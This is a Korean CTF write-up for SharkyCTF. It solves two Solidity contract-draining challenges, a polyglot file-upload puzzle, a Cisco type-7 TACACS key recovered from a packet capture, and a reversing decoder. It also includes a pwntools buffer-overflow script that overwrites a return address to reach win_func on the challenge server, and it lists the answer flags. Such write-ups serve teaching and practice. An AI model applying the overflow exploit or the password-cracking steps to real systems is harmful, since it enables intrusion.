# SharkyCTF writeup

[Blockchain](#blockchain-2)

- [Warmup](#warmup97)
- [Logic](#logic195)

[Misc](#misc-1)

- [Erwin's file manager](#erwins-file-manager197)

[Network](#net-1)

- [RattataTACACS](#RattataTACACS167)

[Pwnable](#pwn-1)

- [Give away 0](#give-away-0160)

[Reversing](#rev-3)

- [Simple](#simple89)
- [z 3 r o b o t w a v e s](#z-3-r-o-b-o-t-w-a-v-e-s188)
- [Miss Direction](#miss-direction400)

[Web](#web-3)

전체적으로 플래그를 **절대** 게싱하지 못하는 문제였다. 길기도 하고 해시가 들어 있었다..ㄷ

출제자 write-up은 [여기](https://gitlab.com/Nofix/sharkyctf/)서 보실 수 있습니다.

## Blockchain (2)

블록체인 문제는 한 사이트로 이루어진다.\
블록체인 문제를 처음 봤는데 처음은... 생각보다 할만하다.\
약간 게싱 문제인 것 같은데 뒷부분은 하나도 모르겠다

![help](Blockchain/help.png)
Help를 보면 위와 같다.\
MetaMask플러그인을 설치하고 테스트넷을 사용한다. ~~메인넷에 있는 이더면 어땠을까~~\
그리고 각 문제마다 Instanciate를 눌러서 contract를 생성하고\
[Ethereum IDE](https://remix.ethereum.org/)를 사용해서 이 contract와 상호작용한다\
그리고 나서 생성한 contract에 있는 모든 돈을 뺏으면 된다.

### Warmup(97)

```ts
pragma solidity = 0.4.25;

contract Warmup {
    bool public locked;

    constructor() public payable {
        locked = true;
    }

    function unlock() public payable {
        require(msg.value == 0.005 ether);
        locked = false;
    }

    function withdraw() public payable {
        require(!locked);
        msg.sender.call.value(address(this).balance)();
    }
}
```

withdraw 함수에 돈을 보내는 코드가 보이는 것 같고, 그 위에 `requre(!locked)`라고 되어있는 것으로 보아 locked를 false로 만들어야 할 것 같다.

locked를 false로 만들 수 있는 함수는 `unlock`이고 그러면 그것을 호출하면 된다.\
unlock이 성공적으로 호출 되기 위해선 0.005 ether를 보내야한다.

ethereum IDE에서 컴파일을 한 후, contract를 추가 해주면 다음과 같이 뜬다\
![warmup](Blockchain/warmup.png)

위쪽 value에 다음과 같이 0.005 ether를 넣어주고 unlock을다누른다\
![warmup-value](Blockchain/warmup%20value.png)

그리고 transaction이 confirm된 후 withdraw를 클릭하면 된다.

> shkCTF{th4t_w4s_4n_1ns4n3_w4rmup_65c8522c0f36ed2566afa7}

### Logic(195)

```ts
pragma solidity = 0.4.25;

contract Logic {
    address public owner;
    bytes32 private passphrase = "th3 fl4g 1s n0t h3r3";

    constructor() public payable {
        owner = msg.sender;
    }

    function withdraw() public {
        require(msg.sender == owner);
        msg.sender.call.value(address(this).balance)();
    }

    function claim(bytes32 _secret) public payable {
        require(msg.value == 0.05 ether && _secret == passphrase);
        owner = msg.sender;
    }
}
```

나머지는 전과 비슷한데 다만 \_secret이 있다. 혹시나 해서 \_secret에 `th3 fl4g 1s n0t h3r3`를 넣어 봤지만 bytes32가 아니라 string이어서 되지 않았다. 그럼 간단하게 이걸 bytes32로 바꾸면 되지 않을 까 생각해서 solidity string to bytes32로 검색해 변환했다.

변환한 값 `0x74683320666c3467203173206e30742068337233000000000000000000000000`와 0.05 ether를 보내니 성공적으로 됐고, withdraw를 호출해 플래그를 얻었다.

> shkCTF{sh4m3_0n_y0u_l1ttl3_byt3_f0f6145540ea8c6ee8067c}

## Crypto (0)

No solve :\

## Forensics (0)

:\

## Misc (1)

### Erwin's file manager(197)

Upload를 보면 다음과 같은 flask 코드가 있다.

```py
@app.route('/upload', methods=["POST"])
def get_file():
	# Wenn die Anfrage eine Datei enthält
	if 'file' in request.files:
		new_file = request.files["file"]
		filename = save_file(new_file)

		# Überprüfen Sie das Dateiformat
		is_ELF = check_ELF(filename)
		is_PDF = check_PDF(filename)
		is_JAR = check_JAR(filename)
		is_JPG = check_JPG(filename)

		if is_ELF and is_JAR and is_PDF:
			put_aside(filename)
			return upload(msg=SECOND_PART_OF_FLAG)
		elif is_ELF and is_JAR:
			put_aside(filename)
			return upload(msg=FIRST_PART_OF_FLAG)
		elif is_JPG and is_JAR:
			put_aside(filename)
			return upload(msg=THIRD_PART_OF_FLAG)
		else:
			# Datei löschen
			remove(filename)
			return upload(error="Bad file")
	else:
		return upload(msg="No file detected")
```

`check~~~` 함수가 어떻게 생겼는지는 알 수 없지만, 예측을 해보면 파일의 signature가 있는지 보는 것 같다. 그래서 단순히 elf, jar, pdf, jpg 파일을 하나씩 구해서 적절히 조합해 풀었다.

이때 pdf파일의 버전 때문에 조금(?) 고생했다.
pdf파일 버전이 1.2일때 잘 된다.

지금 소스코드를 확인해 보니깐 check 함수는 magic모듈과 직접 짠 코드를 사용해서 확인한다.

> shkCTF{Schr0diNgeR\_\_w4s_A_gRea7\_\_p01yg1o7_4e78011325dfbe4a05fd533ea422cc94}

## Net (1)

### RattataTACACS(167)

wireshark로 까보면 TFTP통신을 하는 쪽에서 key 7으로 시작하는 패킷을 볼 수 있다.\
`tacacs-server host 192.168.1.100 key 7 0325612F2835701E1D5D3F2033`

[password cracker](https://www.ifm.net.nz/cookbooks/passwordcracker.html)를 사용해서
키를 알아낼 수 있었다.

key는 `AZDNZ1234FED`이고, 이를 다음과 같이 wireshark preferences에 넣어주면 TACACS+ 패킷을 해석할 수 있다.

![TACACS+ key](Net/tacacsPlus%20key.png)

![TACACS+ flag](Net/tacacsFlag.png)

> shkCTF{T4c4c5_ch4ll3n63_br0}

## Pwn (1)

### Give away 0(160)

바이너리 안에 main, vuln, win_func 함수가 있다.\
main에서 vuln을 호출하고 vuln에서 fgets로 stdin에서 0x32만큼 읽는 구조이다.

vuln에서 RET주소를 win_func주소로 덮으면 된다.

32bit 바이너리인 줄 알았는데 64bit였다... 이것 때문에 잠깐 헤맸다.

```py
from pwn import *

e = ELF("./0_give_away")
p = remote("sharkyctf.xyz", 20333)

win_addr = e.symbols['win_func']
print(win_addr)

code = "A" * 0x20
code += "A" * 8  # SFP
code += p64(win_addr)

p.sendline(code)
p.interactive()
```

> shkCTF{#Fr33_fL4g!!\_<3}

## Rev (3)

### Simple(89)

[asm코드](Rev/simple.asm)를 준다. 어떠한 아키텍처를 특정해서 만들어진 것은 아니기에 컴파일 할 수 있어 보이지는 않는다.

그럼 직접 어셈블리 코드를 해석해야한다.

```py
some = [10, 2, 30, 15, 3, 7, 4, 2, 1, 24, 5, 11, 24, 4, 14,
        13, 5, 6, 19, 20, 23, 9, 10, 2, 30, 15, 3, 7, 4, 2, 1, 24]
second = [0x57, 0x40, 0xa3, 0x78, 0x7d, 0x67, 0x55, 0x40, 0x1e, 0xae, 0x5b, 0x11, 0x5d, 0x40, 0xaa,
          0x17, 0x58, 0x4f, 0x7e, 0x4d, 0x4e, 0x42, 0x5d, 0x51, 0x57, 0x5f, 0x5f, 0x12, 0x1d, 0x5a, 0x4f, 0xbf]
print("some len: %d" % len(some))
print("second len: %d" % len(second))

#! rcx = payload length
#! rdx = end address of payload

# dil: 8bit (ff) -> a char of payload

#! al = payload from back
#! dil = some from back

#! al += dil

#! rax ^= 42
#! r10 = second from back
# a == r10

flag = ""

for i in range(len(some)):
    flag += chr((second[i] ^ 42) - some[i])

print(flag)
```

설명은 여기에 ~~라업 쓰기 귀찮아서 따로 설명 안하는건 안 비밀~~

### z 3 r o b o t w a v e s(188)

### Miss Direction(400)

## Steganography (0)

:\

## Web (3)
